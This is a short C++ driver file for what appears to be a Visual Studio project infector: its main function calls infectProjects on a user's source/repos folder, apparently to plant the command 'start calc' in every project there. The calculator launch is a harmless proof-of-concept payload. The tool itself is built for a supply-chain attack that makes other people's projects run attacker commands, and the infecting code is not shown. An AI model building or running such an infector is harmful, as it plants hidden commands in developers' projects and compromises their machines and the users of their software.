#include "src/vs infector.h"
#include <iostream>
#include <Windows.h>


int main() {
	
	// your path should be the root to your projects eg. C:\\Users\\dwx\\source\\repos
	infectProjects(L"C:\\Users\\dwx\\source\\repos", L"start calc");
	std::wcin.get(); // keeps the console from closing automatically

	return 0;
}